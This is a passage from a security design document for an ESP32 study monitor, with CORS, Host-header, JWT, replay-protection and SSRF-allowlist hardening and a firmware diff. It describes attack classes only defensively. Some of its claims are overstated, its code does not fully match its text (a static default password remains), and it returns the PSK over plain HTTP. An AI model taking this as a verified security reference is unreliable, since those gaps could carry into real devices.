   - In early designs, reflecting `Access-Control-Allow-Origin: null` when `Origin: null` was received enabled an external attacker website embedding `<iframe sandbox="allow-scripts">` to bypass browser Same-Origin Policy and read telemetry from local ESP32 endpoints.
   - The ESP32 strictly validates `server.header("Origin")` against authorized origins (`https://studysense-eight.vercel.app`, `https://appassets.androidplatform.net`, `http://localhost:*`). If the origin matches, it is echoed back; otherwise, CORS headers fallback to the static trusted production domain and never reflect `null`.
   - Native mobile applications route communications through native background bridges (`URLSession` / `HttpURLConnection`) and are entirely unaffected by browser CORS.
2. **Preflight Enforcement on All Endpoints**:
   - `Access-Control-Allow-Headers` is restricted to `Content-Type, X-StudySense-Timestamp, X-StudySense-Nonce, X-StudySense-Signature`.
   - Explicit `HTTP_OPTIONS` handlers are registered across `/status`, `/api/status`, `/config`, `/timer`, `/api/cmd`, `/api/pair`, and `/api/provision-wifi`, returning `HTTP 204 No Content` with hardened headers.
3. **Unconditional Host Header Validation (Anti-DNS Rebinding)**:
   - Host header validation runs unconditionally on every request **before** checking provisioning state or authentication headers:
     ```cpp
     bool validateHostHeader() {
       String host = server.hostHeader();
       int colonIdx = host.indexOf(':');
       if (colonIdx != -1) host = host.substring(0, colonIdx); // Strip port
       return (host == WiFi.localIP().toString() || 
               host == WiFi.softAPIP().toString() || 
               host.equalsIgnoreCase("studysense.local") || 
               host == "192.168.4.1");
     }
     ```
   - Host comparison against `"studysense.local"` is case-insensitive (`equalsIgnoreCase`) per RFC 7230, preventing false rejections of Apple Bonjour/mDNS clients sending mixed-case hosts.

### 4.5 Flash Memory Wear-Out Protection (Power-Cycle Resistant)
To guarantee long-term physical hardware endurance under arbitrary usage and power-cycling attacks:
1. **In-Memory RAM Caching**:
   - All profile reads and runtime modifications operate exclusively on the in-memory C++ struct `profiles[activeProfileIdx]`.
2. **Byte-Level Dirty-Checking**:
   - Before committing configuration changes to NVS flash, incoming configuration values are compared against current RAM values. If no properties have changed, the operation returns `200 OK` immediately without writing a single byte to flash.
3. **Coalesced Commits & Power-Cycle Resistance**:
   - When settings are modified, a volatile boolean flag `isConfigDirty = true` is set, and `lastConfigChangeTime = millis()` is updated.
   - `checkFlashCommit()` is invoked on every iteration of FreeRTOS `loop()`.
   - Flash commits require both:
     a) A **5-second quiet period** after the last change (`now - lastConfigChangeTime >= 5000`).
     b) A **minimum 60-second continuous device uptime** before the first commit (`now >= FLASH_MIN_WRITE_INTERVAL_MS`), and a minimum 60-second interval between subsequent commits (`now - lastFlashWriteTime >= 60000`). This completely thwarts power-cycling attacks that reset volatile timers to force continuous writes on boot.
   - A leaky-bucket rate limiter rejects `/config` requests exceeding **1 request per 10 seconds** with `HTTP 429 Too Many Requests`.

---

## 5. Cloud Sync Security & Data Privacy (R4)

### 5.1 End-to-End Transport Security (TLS 1.3)
All communication between client companion apps and the Vercel serverless cloud infrastructure is conducted strictly over **TLS 1.3** (with TLS 1.2 fallback). Cleartext HTTP is rejected at the Vercel Edge routing layer via HTTP Strict Transport Security (HSTS):
`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`

### 5.2 Authentication & Authorization (Bearer JWT Migration)
The insecure `x-user-id` header is permanently deprecated. Authentication is migrated to standard **Bearer JSON Web Tokens (JWT)**:

#### JWT Token Specification
- **Algorithm**: `HS256` (HMAC with SHA-256 using server-side `STUDYSENSE_JWT_SECRET`) or asymmetric `RS256` / `EdDSA`.
- **Header**:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
- **Payload Claims**:
  ```json
  {
    "sub": "usr_9a8b7c6d5e4f",
    "iss": "https://studysense-eight.vercel.app",
    "aud": "studysense-cloud-api",
    "iat": 1732451400,
    "exp": 1735043400,
    "role": "student",
    "deviceId": "esp32_1234"
  }
  ```
- **Verification Rule**:
  `api/sync.js` extracts the token from `Authorization: Bearer <token>`. The server executes strict cryptographic validation:
  1. **Mandatory Expiration Claim**: The JWT payload **must** include a numeric `exp` claim (`typeof payload.exp === 'number'`). If `exp` is missing or `Date.now() / 1000 > payload.exp`, authentication fails immediately. Tokens without expiration are unconditionally rejected.
  2. **Fail-Closed Secret Management**: `process.env.STUDYSENSE_JWT_SECRET` is strictly required. If unset in the deployment environment, the function fails closed with `HTTP 500 Server Error` (`{"error":"Server authentication misconfiguration: JWT secret required"}`). Static development secret fallbacks are completely banned.
  3. **Timing-Safe Pre-Hashed Verification**: To prevent timing side-channels and eliminate Node.js `crypto.timingSafeEqual` `RangeError` exceptions on buffer length mismatches, both the incoming base64 signature and the computed expected signature are hashed with SHA-256 prior to constant-time evaluation.
  4. **Strict Identity Derivation**: The authenticated user ID is derived **exclusively** from the verified `sub` claim. Query-string or header overrides (`?userId=`) are completely ignored.

### 5.3 Database Persistence Architecture
The ephemeral in-memory dictionary (`let memoryStore = {}`) is eliminated in favor of managed persistent cloud storage.

#### Database Technology Options
1. **Primary Recommendation**: **Upstash Redis / Vercel KV** (ultra-low latency, key-value document store with native REST API perfectly suited for Vercel Serverless edge functions).
2. **Relational Alternative**: **PostgreSQL via Prisma / Neon** (structured relational tables for institutional deployments).

#### Redis KV Document Schema
- **Key Format**: `studysense:user:{userId}:profile`
- **JSON Structure**:
  ```json
  {
    "userId": "usr_9a8b7c6d5e4f",
    "activeProfileId": 1732451408123,
    "profiles": [
      {
        "id": 1732451408123,
        "name": "Learner-4821",
        "studyMins": 25,
        "breakMins": 5,
        "minDist": 30,
        "postureAlert": true,
        "buzzer": true,
        "led": true,
        "todayStudied": 45
      }
    ],
    "device": "iOS",
    "schemaVersion": 2,
    "lastSyncedAt": "2026-11-24T12:30:00.000Z",
    "updatedAt": "2026-11-24T12:30:00.000Z"
  }
  ```

### 5.4 Student Privacy & Regulatory Compliance

#### A. Children's Online Privacy Protection Act (COPPA - 15 U.S.C. §§ 6501–6506)
- **Data Minimization**: The cloud service **never** collects, processes, or stores real student full names, email addresses, phone numbers, or geolocations.
- **Default Pseudonymization**: The client application automatically assigns randomized student identifiers (e.g. `Learner-4821`, `FocusPro-1092`). If a child or parent customizes a name in the UI, it is sanitized to remove special characters and clamped to 32 characters.
- **Verifiable Parental Consent (VPC)**: When deployed for children under 13, cloud synchronization is disabled by default ("Local Only Mode"). Cloud sync is activated only after parental confirmation.

#### B. General Data Protection Regulation (GDPR / GDPR-K - EU 2016/679)
- **Lawful Basis (Art. 6 & 9)**: StudySense processes study habits and posture telemetry under explicit user consent. Physical posture metrics (ultrasonic distances) are classified as biometric/health-adjacent indicators.
- **Biometric Exclusion**: **Raw ultrasonic distance measurements and real-time PIR motion ticks are NEVER transmitted to the cloud**. Only aggregated, non-biometric session summaries (`minutesStudied: 25`, `postureQualityScore: 92%`) are synchronized.
- **Right to Erasure (Art. 17 - Right to be Forgotten)**: `api/sync.js` implements a dedicated `DELETE` handler:
  ```http
  DELETE /api/sync HTTP/1.1
  Authorization: Bearer <token>
  ```
  Upon receipt, the user's entire cloud record is immediately purged from the database, returning `HTTP 204 No Content`.
- **Encryption at Rest (Art. 32)**: All database storage volumes utilize AES-256 encryption at rest.

#### C. Family Educational Rights and Privacy Act (FERPA - 34 CFR Part 99)
- In school or classroom environments, academic study durations and focus ratings constitute education records. StudySense enforces tenant data isolation: cross-tenant enumeration is mathematically impossible under cryptographically signed JWT authorization.

### 5.5 Mobile Hybrid Networking Resolution (`file:///api/sync` Deadlock)
In native mobile apps, `index.html` is loaded locally from disk (`file:///android_asset/index.html` or `file:///.../www/index.html`).
- **The Deadlock**: Calling `fetch('/api/sync')` from a `file://` origin resolves to `file:///api/sync`, which fails immediately.
- **The Resolution**:
  1. Define a dynamic API base URL:
     ```javascript
     const CLOUD_API_BASE = (window.location.protocol === 'file:')
       ? 'https://studysense-eight.vercel.app'
       : '';
     ```
  2. For mobile clients, route local hardware control and cloud synchronization through a **Hardened Native Background Bridge** (Swift `URLSession` on iOS and Java `HttpURLConnection` on Android). The native bridge executes network requests outside the WebView JavaScript runtime, ensuring strict adherence to OS security policies, hardware Keychain/Keystore token retrieval, and immunity to browser sandbox limitations.
  3. **Bridge Security Architecture & Protections**:
     - **SSRF & Signing Oracle Defense**: Bridges strictly whitelist destination URLs. Only requests targeting the paired ESP32 (`192.168.4.1`, `studysense.local`, or RFC 1918 local LAN DHCP subnets `192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12` over HTTP/HTTPS) or the official cloud sync domain (`https://studysense-eight.vercel.app` over HTTPS only) are signed and transmitted. Arbitrary external, loopback (`127.0.0.0/8`), and link-local/metadata (`169.254.0.0/16`) destinations are rejected with HTTP 403, preventing untrusted scripts from using the native bridge as an SSRF proxy or cryptographic signature oracle.
     - **JavaScript Code Injection Defense & Harmonized Callback Contract**: Both iOS and Android bridges invoke a single uniform JavaScript callback signature: `window._onNativeBridgeResponse(callbackId, success, statusCode, responseData)`. Bridges avoid raw unescaped string interpolation by serializing arguments into structured JSON via `JSONSerialization` on iOS and `JSONTokener`/`JSONArray`/`JSONObject` on Android (with `\u2028`/`\u2029` line-separator escaping). Callback IDs are strictly sanitized against alphanumeric regex (`^[a-zA-Z0-9_-]{1,64}$`), and non-JSON error responses are safely wrapped as `{"raw": "..."}`, eliminating `SyntaxError` freezes and breakout script execution in the WebView security context.
     - **Full Response Payload Streaming**: The native bridge fully streams server response bodies via `conn.getInputStream()` (and `conn.getErrorStream()` on non-200 responses) into the client callback, completely eliminating empty `{}` dummy facades.

---

## 6. ESP32 Cryptographic & Hardware Feasibility Proof

A critical engineering decision in this architecture is the selection of **Application-Layer HMAC-SHA256 Request Signing over Local HTTPS**. This section provides the rigorous hardware, memory, and cryptographic proof validating this choice.

### 6.1 ESP32 SRAM Architecture & Heap Consumption Breakdown
The ESP32 microcontroller features 520 KB of internal SRAM. However, the internal SRAM is physically and architecturally partitioned:
- **ROM & System Reserved**: ~192 KB
- **Internal SRAM 1 & 2 (D/IRAM)**: ~328 KB of usable dynamic Data RAM (DRAM).

When running the StudySense firmware, DRAM is allocated across system subsystems as detailed below:

```
+---------------------------------------------------------------------------------------------------------+
|                                    ESP32 DRAM MEMORY ALLOCATION (328 KB)                                |
+---------------------------------------------------------------------------------------------------------+

  [FreeRTOS Kernel, lwIP TCP/IP Stack & Wi-Fi Driver Buffers]       ~50 KB
  ═══════════════════════════════════════════════════════════════════════════════════════════════════════
  [Bluedroid Bluetooth Classic / BLE Stack (If Loaded)]              ~110 KB
  ═══════════════════════════════════════════════════════════════════════════════════════════════════════
  [Arduino Core Framework, Hardware Drivers, FreeRTOS Tasks]         ~35 KB
  ═══════════════════════════════════════════════════════════════════════════════════════════════════════
  [Baseline Free Heap Available for Web Server & Security]           ~133 KB (or ~243 KB without BLE)
```

#### Detailed Comparison: Application-Layer HMAC-SHA256 vs. Local TLS/HTTPS

| Subsystem Component | Local HTTPS Server (`WiFiServerSecure` / mbedTLS) | Application-Layer HMAC-SHA256 (`WebServer` + `mbedtls/md.h`) |
| :--- | :--- | :--- |
| **TLS Session Context** | ~8 KB per active connection | **0 KB** (Plaintext TCP socket) |
| **mbedTLS Input Buffer** | ~16.5 KB (Maximum TLS record size) | **0 KB** (Managed in 1KB HTTP chunk) |
| **mbedTLS Output Buffer**| ~16.5 KB | **0 KB** |
| **RSA/ECC Crypto Context**| ~6–10 KB during asymmetric handshake | **0 KB** |
| **HMAC Context (`mbedtls_md_context_t`)** | N/A | **128 bytes** |
| **Sliding Nonce Ring Buffer (32 slots)** | N/A | **512 bytes** |
| **RAM Configuration Cache** | ~300 bytes | **~300 bytes** |
| **ArduinoJson Buffer (`StaticJsonDocument<512>`)** | ~512 bytes | **~512 bytes** |
| **Total RAM Overhead per Active Connection** | **47 KB – 59 KB per socket** | **< 1.5 KB total system overhead** |
| **Max Concurrent Sockets within Safe Heap** | **1–2 sockets** (High risk of heap fragmentation OOM) | **4 concurrent sockets** with >100 KB heap headroom |

**Conclusion**: Establishing an HTTPS server on port 443 on the ESP32 consumes between 47 KB and 59 KB of RAM *per active client connection*. Rapid polling every 1.5 seconds from multiple client apps causes catastrophic dynamic heap fragmentation and triggers FreeRTOS panic reboots (`heap_caps_alloc failed`). In contrast, HMAC-SHA256 operates with **under 1.5 KB total system overhead**, leaving over 100 KB of pristine contiguous heap.

### 6.2 Hardware Crypto Acceleration & Latency Benchmarks
The ESP32 Xtensa Dual-Core LX6 processor incorporates dedicated hardware cryptographic engines:
- **Hardware SHA Accelerator**: Supports SHA-1, SHA-256, SHA-384, and SHA-512.
- **Hardware AES Accelerator**: Supports AES-128, AES-192, and AES-256 in CBC, CFB, CTR, GCM, and ECB modes.
- **True Random Number Generator (TRNG)**: Samples thermal noise from the internal Wi-Fi/Bluetooth analog radio subsystems.

#### Hardware SHA-256 Execution Benchmark
Under mbedTLS with hardware acceleration enabled (standard in ESP-IDF and Arduino-ESP32 via `CONFIG_MBEDTLS_HARDWARE_SHA=y`):

$$\text{Clock Speed} = 240\text{ MHz} \implies 1\text{ clock cycle} \approx 4.167\text{ nanoseconds}$$

- **Block Transformation Time**: A 64-byte SHA-256 message block is processed by the hardware pipeline in **85 clock cycles**:
  $$\text{Latency}_{\text{block}} = 85 \times 4.167\text{ ns} \approx 0.354\text{ microseconds}$$
- **Full HMAC-SHA256 Calculation**:
  For an HTTP request canonical string of ~128 bytes (Method + URI + Timestamp + Nonce + Body), HMAC-SHA256 requires:
  1. Key preprocessing (Inner pad block: 64 bytes).
  2. Hashing inner pad + message (3 blocks: 192 bytes).
  3. Key preprocessing (Outer pad block: 64 bytes).
  4. Hashing outer pad + inner hash (2 blocks: 128 bytes).
  - Total Hardware Engine Execution Time: $\approx 2.1\text{ microseconds}$.
  - Total Software Wrapper & String Formatting Overhead: $\approx 1.2\text{ milliseconds}$.
- **Sensor Sampling Impact**: The HC-SR04 ultrasonic echo measurement takes up to 30ms (speed of sound in air). A 1.2ms cryptographic verification is completely imperceptible to the real-time sensor loop.

### 6.3 The Mobile WebView "Local HTTPS" Dilemma
Beyond microcontroller memory constraints, implementing HTTPS on local private IP addresses (`192.168.4.1`) creates an insurmountable client trust failure:
1. **Public CA Ineligibility**: Public Certificate Authorities (e.g. Let's Encrypt, DigiCert) operate under CA/Browser Forum Baseline Requirements and **strictly forbid issuing public TLS certificates for RFC 1918 private IP addresses** (`192.168.x.x`, `10.x.x.x`).
2. **Mobile Sandbox Rejection**: While desktop browsers allow users to bypass a self-signed certificate warning via advanced flags, **Apple WKWebView and Android WebView reject self-signed certificates by default**:
   - iOS WKWebView terminates the connection with `NSURLErrorServerCertificateUntrusted` (-1202) without presenting any UI bypass option unless unsafe private delegate methods are implemented.
   - Android WebView triggers `onReceivedSslError()` and blocks resource loading.
3. **mDNS Domain Certificates**: Using a local domain (e.g. `studysense.local`) still requires provisioning a private Root Certificate Authority (CA) into the iOS System Keychain and Android System Trust Store, a process requiring complex Mobile Device Management (MDM) profiles that is completely unviable for consumer students and parents.

**Definitive Verdict**: Application-layer HMAC-SHA256 request signing over HTTP port 80 is the **only architecturally robust, cryptographically sound, and cross-platform viable solution** for local ESP32 communication.

### 6.4 ESP32 Flash Partition Scheme & Build Footprint
Under Arduino ESP32 Core v3.x (`esp32:esp32` v3.3.13) with Wi-Fi, BLE (`BLEDevice`), `ESPmDNS`, `ArduinoJson` v6, and `mbedtls` linked simultaneously, the compiled firmware image measures **~1,796 KB** of flash text/rodata (~67 KB global DRAM).
- **Default Partition Overflow**: The default 4MB ESP32 partition table (`default`, 1.2 MB app slot / 1,310,720 bytes max) **cannot fit** the security-hardened firmware (`>132%` overflow).
- **Mandatory Partition Scheme**: Firmware builds **must** target `PartitionScheme=min_spiffs` (1.9 MB app slot / 1,966,080 bytes max, yielding ~91% utilization with zero OTA truncation) or `PartitionScheme=huge_app` (3.0 MB app slot):
  ```bash
  arduino-cli compile --fqbn esp32:esp32:esp32:PartitionScheme=min_spiffs esp32/SmartStudyMonitor
  ```

---

## 7. Phased Implementation Roadmap & Concrete Code Diffs (R5)

### 7.1 Phase 1: ESP32 Firmware Hardening (`esp32/SmartStudyMonitor/SmartStudyMonitor.ino`)

> **Build Partition Requirement**: Compile using `PartitionScheme=min_spiffs` (or `huge_app`) in Arduino IDE / `arduino-cli` (`esp32:esp32:esp32:PartitionScheme=min_spiffs`) as detailed in Section 6.4.

The firmware modification accomplishes:
1. Required ESP-IDF and mDNS system header inclusions (`<ESPmDNS.h>`, `"esp_mac.h"`, `"esp_netif.h"`, `<ArduinoJson.h>`, `"mbedtls/md.h"`).
2. Dynamic MAC-derived SSID (`StudySense-[MAC12]`) and CSPRNG setup passphrase generation.
3. 5-minute commissioning window with physical button 5-second hold trigger and auto-timeout.
4. SoftAP client disconnect event handler to immediately reclaim DHCP leases against mobile MAC randomization.
5. Station mode initialization (`initWiFiStation`) with SoftAP teardown, SNTP time sync (`pool.ntp.org`), and mDNS responder registration (`MDNS.begin("studysense")`, `MDNS.addService("http", "tcp", 80)`, `MDNS.addService("studysense", "tcp", 80)`).
6. Native WebServer header collection via `server.collectHeaders(...)` for custom authentication headers.
7. Native HMAC-SHA256 request signature verification using `mbedtls/md.h` with query parameter binding.
8. Timestamp validity verification ($|T_{\text{device}} - T_{\text{request}}| \le 300\text{s}$) and uninitialized PSK protection.
9. Enhanced 64-slot nonce replay protection with monotonic timestamp high-water marking.
10. Unconditional anti-DNS rebinding Host header validation with case-insensitive RFC 7230 matching and interface-state guards.
11. CORS origin lockdown eliminating reflection of `Origin: null` and explicit `HTTP_OPTIONS` preflight handlers.
12. Concrete handler implementations for `POST /api/pair` and `POST /api/provision-wifi`.
13. Power-cycle resistant flash wear-out prevention with dirty-checking, 60s minimum uptime guard, and loop commit execution.
14. Robust JSON parsing via `ArduinoJson`.

#### Unified Diff: `esp32/SmartStudyMonitor/SmartStudyMonitor.ino`

```diff
--- a/esp32/SmartStudyMonitor/SmartStudyMonitor.ino
+++ b/esp32/SmartStudyMonitor/SmartStudyMonitor.ino
@@ -33,6 +33,11 @@
 #include <WiFi.h>
 #include <WebServer.h>
 #include <Preferences.h>
+#include <ESPmDNS.h>
+#include "esp_mac.h"
+#include "esp_netif.h"
+#include <ArduinoJson.h>
+#include "mbedtls/md.h"
 #include <BLEDevice.h>
 #include <BLEServer.h>
 #include <BLEUtils.h>
@@ -50,15 +55,41 @@
 constexpr uint8_t PIN_ONBOARD_LED = 2; // Onboard ESP32 Blue LED (Heartbeat / Diagnostic)
 
 // ======================= 2. WI-FI & BLE CONFIGURATION ======================
-const char* AP_SSID = "StudyMonitor";
-const char* AP_PASS = "study1234";
+char apSsid[32] = "StudySense-Setup";
+char apPass[16] = "study1234";
+String devicePsk = "";
+bool isProvisioningMode = false;
+unsigned long provisioningStartTime = 0;
+constexpr unsigned long PROVISIONING_TIMEOUT_MS = 300000; // 5 Minutes
+unsigned long lastSyncEpoch = 0;
+unsigned long lastSyncMillis = 0;
+unsigned long maxObservedTimestamp = 0;
 
+// Security Nonce Cache for Replay Attack Prevention
+struct NonceEntry {
+  String nonce;
+  unsigned long timestamp;
+};
+constexpr size_t NONCE_CACHE_SIZE = 64;
+NonceEntry nonceCache[NONCE_CACHE_SIZE];
+size_t nonceCacheIdx = 0;
+
+// Flash Wear-Out Protection Variables
+bool isConfigDirty = false;
+unsigned long lastConfigChangeTime = 0;
+constexpr unsigned long FLASH_COALESCE_DELAY_MS = 5000;  // 5-second quiet period
+constexpr unsigned long FLASH_MIN_WRITE_INTERVAL_MS = 60000; // Max 1 write per 60s
+unsigned long lastFlashWriteTime = 0;
+
+bool btnCommissioningHandled = false;
+
 IPAddress local_IP(192, 168, 4, 1);
 IPAddress gateway(192, 168, 4, 1);
 IPAddress subnet(255, 255, 255, 0);
 
 WebServer server(80);
 Preferences prefs;
+Preferences secPrefs;
 
 // BLE UUIDs
 #define BLE_SERVICE_UUID        "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
@@ -440,12 +471,175 @@
   }
 }
 
-void sendCorsHeaders() {
-  server.sendHeader("Access-Control-Allow-Origin", "*");
+void sendHardenedCorsHeaders() {
+  String origin = server.header("Origin");
+  if (origin == "https://studysense-eight.vercel.app" ||
+      origin == "https://appassets.androidplatform.net" ||
+      origin.startsWith("http://localhost:")) {
+    server.sendHeader("Access-Control-Allow-Origin", origin);
+    server.sendHeader("Access-Control-Allow-Credentials", "true");
+  } else {
+    server.sendHeader("Access-Control-Allow-Origin", "https://studysense-eight.vercel.app");
+  }
   server.sendHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
-  server.sendHeader("Access-Control-Allow-Headers", "Content-Type");
+  server.sendHeader("Access-Control-Allow-Headers", "Content-Type,X-StudySense-Timestamp,X-StudySense-Nonce,X-StudySense-Signature");
+}
+
+bool validateHostHeader() {
+  String host = server.hostHeader();
+  int colonIdx = host.indexOf(':');
+  if (colonIdx != -1) host = host.substring(0, colonIdx);
+  bool matchSta = (WiFi.status() == WL_CONNECTED) && (host == WiFi.localIP().toString());
+  bool matchAp = (WiFi.getMode() & WIFI_MODE_AP) && (host == WiFi.softAPIP().toString());
+  return (matchSta ||
+          matchAp ||
+          host.equalsIgnoreCase("studysense.local") ||
+          host == "192.168.4.1");
+}
+
+void initWiFiStation(const String& ssid, const String& pass) {
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(ssid.c_str(), pass.c_str());
+  unsigned long startMs = millis();
+  while (WiFi.status() != WL_CONNECTED && (millis() - startMs) < 15000) {
+    delay(250);
+  }
+  if (WiFi.status() == WL_CONNECTED) {
+    Serial.print("[Wi-Fi STA] Connected! IP: http://");
+    Serial.println(WiFi.localIP());
+    configTime(0, 0, "pool.ntp.org");
+    if (MDNS.begin("studysense")) {
+      MDNS.addService("http", "tcp", 80);
+      MDNS.addService("studysense", "tcp", 80);
+      Serial.println("[mDNS] Responder started: http://studysense.local");
+    }
+  } else {
+    Serial.println("[Wi-Fi STA] Connection timeout (15s). Entering offline standby.");
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_OFF);
+  }
+}
+
+bool verifyRequestAuth() {
+  // 1. Enforce Host header validation unconditionally before any auth bypass
+  if (!validateHostHeader()) {
+    server.send(403, "application/json", "{\"error\":\"Invalid Host header\"}");
+    return false;
+  }
+
+  // 2. Reject requests if device has not been paired / PSK uninitialized
+  if (devicePsk.length() < 32) {
+    server.send(503, "application/json", "{\"error\":\"Device not paired: PSK uninitialized\"}");
+    return false;
+  }
+
+  // 3. Verify presence of required HMAC authentication headers
+  if (!server.hasHeader("X-StudySense-Timestamp") || 
+      !server.hasHeader("X-StudySense-Nonce") || 
+      !server.hasHeader("X-StudySense-Signature")) {
+    server.send(401, "application/json", "{\"error\":\"Missing required authentication headers\"}");
+    return false;
+  }
+
+  String tsStr = server.header("X-StudySense-Timestamp");
+  String nonce = server.header("X-StudySense-Nonce");
+  String clientSig = server.header("X-StudySense-Signature");
+  String body = server.arg("plain");
+
+  // 4. Runtime Timestamp Expiration & Clock Drift Validation (|T_device - T_req| <= 300s)
+  unsigned long reqTs = strtoul(tsStr.c_str(), NULL, 10);
+  time_t nowSecs;
+  time(&nowSecs);
+  if (nowSecs > 1700000000) {
+    if (abs((long)nowSecs - (long)reqTs) > 300) {
+      server.send(403, "application/json", "{\"error\":\"Timestamp expired or clock skew exceeded\"}");
+      return false;
+    }
+  } else if (lastSyncEpoch > 0) {
+    unsigned long estimatedNow = lastSyncEpoch + ((millis() - lastSyncMillis) / 1000);
+    if (abs((long)estimatedNow - (long)reqTs) > 300) {
+      server.send(403, "application/json", "{\"error\":\"Timestamp expired or clock skew exceeded\"}");
+      return false;
+    }
+  }
+  // Monotonic window check: reject nonces older than active high-water mark window
+  if (maxObservedTimestamp > 300 && reqTs + 300 < maxObservedTimestamp) {
+    server.send(403, "application/json", "{\"error\":\"Timestamp predates active replay window\"}");
+    return false;
+  }
+
+  // 5. Sliding Nonce Ring Buffer Check (Replay Attack Shield)
+  for (size_t i = 0; i < NONCE_CACHE_SIZE; i++) {
+    if (nonceCache[i].nonce.length() > 0 && nonceCache[i].nonce == nonce) {
+      server.send(403, "application/json", "{\"error\":\"Replay detected: Nonce already used\"}");
+      return false;
+    }
+  }
+
+  // 6. Compute HMAC-SHA256 with Query Parameter Binding
+  String queryStr = "";
+  if (server.args() > 0) {
+    bool first = true;
+    for (int i = 0; i < server.args(); i++) {
+      if (server.argName(i) == "plain") continue;
+      if (!first) queryStr += "&";
+      queryStr += server.argName(i) + "=" + server.arg(i);
+      first = false;
+    }
+  }
+  String fullPath = server.uri() + (queryStr.length() > 0 ? "?" + queryStr : "");
+  String methodStr = (server.method() == HTTP_POST) ? "POST" : "GET";
+  String canonical = methodStr + "\n" + fullPath + "\n" + tsStr + "\n" + nonce + "\n" + body;
+
+  byte hmacResult[32];
+  mbedtls_md_context_t ctx;
+  mbedtls_md_init(&ctx);
+  mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), 1);
+  mbedtls_md_hmac_starts(&ctx, (const unsigned char*)devicePsk.c_str(), devicePsk.length());
+  mbedtls_md_hmac_update(&ctx, (const unsigned char*)canonical.c_str(), canonical.length());
+  mbedtls_md_hmac_finish(&ctx, hmacResult);
+  mbedtls_md_free(&ctx);
+
+  char hexResult[65];
+  for (int i = 0; i < 32; i++) sprintf(&hexResult[i * 2], "%02x", hmacResult[i]);
+  hexResult[64] = '\0';
+
+  // Constant-time comparison
+  if (clientSig.length() != 64) {
+    server.send(403, "application/json", "{\"error\":\"Invalid signature format\"}");
+    return false;
+  }
+  unsigned char diff = 0;
+  for (size_t i = 0; i < 64; i++) {
+    diff |= (clientSig[i] ^ hexResult[i]);
+  }
+  if (diff != 0) {
+    server.send(403, "application/json", "{\"error\":\"Signature verification failed\"}");
+    return false;
+  }
+
+  // 7. Store Nonce and Update High-Water Mark
+  nonceCache[nonceCacheIdx] = { nonce, reqTs };
+  nonceCacheIdx = (nonceCacheIdx + 1) % NONCE_CACHE_SIZE;
+  if (reqTs > maxObservedTimestamp) maxObservedTimestamp = reqTs;
+  return true;
 }
 
+void checkFlashCommit() {
+  if (!isConfigDirty) return;
+  unsigned long now = millis();
+  // Require at least 60s of continuous uptime before permitting write (power-cycle attack shield)
+  if (now < FLASH_MIN_WRITE_INTERVAL_MS) return;
+  if ((now - lastConfigChangeTime >= FLASH_COALESCE_DELAY_MS) &&
+      (now - lastFlashWriteTime >= FLASH_MIN_WRITE_INTERVAL_MS || lastFlashWriteTime == 0)) {
+    saveProfileToPrefs(activeProfileIdx);
+    isConfigDirty = false;
+    lastFlashWriteTime = now;
+    Serial.println("[Security Flash Shield] Coalesced profile written to NVS flash.");
+  }
+}
+
 String buildStatusJson() {
   bool ledG, ledB, ledR;
   updateLEDs(ledG, ledB, ledR);
@@ -629,22 +823,97 @@
 
 void setupWebServer() {
   server.on("/", HTTP_GET, []() {
-    sendCorsHeaders();
+    sendHardenedCorsHeaders();
     server.send_P(200, "text/html", INDEX_HTML);
   });
 
+  // Pairing & Commissioning Endpoints
+  server.on("/api/pair", HTTP_POST, []() {
+    sendHardenedCorsHeaders();
+    if (!validateHostHeader()) {
+      server.send(403, "application/json", "{\"error\":\"Invalid Host header\"}");
+      return;
+    }
+    if (!isProvisioningMode) {
+      server.send(403, "application/json", "{\"error\":\"Pairing permitted only in provisioning mode\"}");
+      return;
+    }
+    StaticJsonDocument<256> doc;
+    if (deserializeJson(doc, server.arg("plain"))) {
+      server.send(400, "application/json", "{\"error\":\"Invalid JSON\"}");
+      return;
+    }
+    const char* pin = doc["setupPin"];
+    String savedPin = secPrefs.getString("setup_pin", "");
+    if (!pin || savedPin.length() == 0 || savedPin != String(pin)) {
+      server.send(401, "application/json", "{\"error\":\"Invalid setup PIN\"}");
+      return;
+    }
+    // Generate 256-bit CSPRNG PSK (64 hex characters)
+    char newPsk[65];
+    for (int i = 0; i < 32; i++) {
+      uint8_t b = esp_random() & 0xFF;
+      sprintf(&newPsk[i * 2], "%02x", b);
+    }
+    newPsk[64] = '\0';
+    devicePsk = String(newPsk);
+    secPrefs.putString("device_psk", devicePsk);
+
+    if (server.hasHeader("X-StudySense-Timestamp")) {
+      lastSyncEpoch = strtoul(server.header("X-StudySense-Timestamp").c_str(), NULL, 10);
+      lastSyncMillis = millis();
+    }
+    Serial.println("[PAIRING] Successful pairing ceremony! New 256-bit PSK provisioned.");
+    server.send(200, "application/json", "{\"status\":\"paired\",\"devicePsk\":\"" + devicePsk + "\"}");
+  });
+
+  server.on("/api/provision-wifi", HTTP_POST, []() {
+    sendHardenedCorsHeaders();
+    if (!verifyRequestAuth()) return;
+    StaticJsonDocument<256> doc;
+    if (deserializeJson(doc, server.arg("plain"))) {
+      server.send(400, "application/json", "{\"error\":\"Invalid JSON\"}");
+      return;
+    }
+    const char* ssid = doc["ssid"];
+    const char* pass = doc["pass"];
+    if (!ssid || strlen(ssid) == 0) {
+      server.send(400, "application/json", "{\"error\":\"SSID required\"}");
+      return;
+    }
+    secPrefs.putString("wifi_ssid", ssid);
+    secPrefs.putString("wifi_pass", pass ? pass : "");
+    server.send(200, "application/json", "{\"status\":\"wifi_configured\"}");
+    Serial.println("[PROVISION] Wi-Fi credentials saved. Initiating Station connection...");
+    isProvisioningMode = false;
+    delay(250);
+    initWiFiStation(String(ssid), String(pass ? pass : ""));
+  });
+
+  // Explicit HTTP_OPTIONS preflight handlers on all API routes
+  server.on("/api/pair", HTTP_OPTIONS, []() { sendHardenedCorsHeaders(); server.send(204); });
+  server.on("/api/provision-wifi", HTTP_OPTIONS, []() { sendHardenedCorsHeaders(); server.send(204); });
+  server.on("/api/status", HTTP_OPTIONS, []() { sendHardenedCorsHeaders(); server.send(204); });
+  server.on("/status", HTTP_OPTIONS, []() { sendHardenedCorsHeaders(); server.send(204); });
